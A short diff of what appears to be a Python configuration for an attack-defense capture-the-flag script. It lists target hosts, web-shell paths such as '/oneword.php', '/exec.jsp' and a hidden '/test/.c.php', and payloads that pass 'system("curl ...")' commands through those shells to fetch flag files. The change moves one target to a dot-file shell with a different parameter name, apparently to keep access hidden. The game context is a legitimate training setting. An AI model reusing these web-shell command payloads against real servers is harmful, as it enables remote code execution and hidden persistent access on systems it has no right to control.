@@ -18,7 +18,7 @@ host_flags=(
     #(1,'172.16.5.10:806','/uploadfile/user/b/1/gf6.txt'),
     #(1,'172.16.5.10:802','/templates/beez_20/gf1.txt')
     #(2,'172.16.8.144:8080','/exec.jsp',{'cmd':'curl -s http://172.16.80.1:8000/flag.txt'})
-    (3,'172.16.80.144','/oneword.php',{'cmd':'system("curl -s http://172.16.80.1:8000/flag.txt");'}),
+    (3,'172.16.80.144','/test/.c.php',{'o':'system("curl -s http://172.16.80.1:8000/flag.txt");'}),
     )
 
 '''
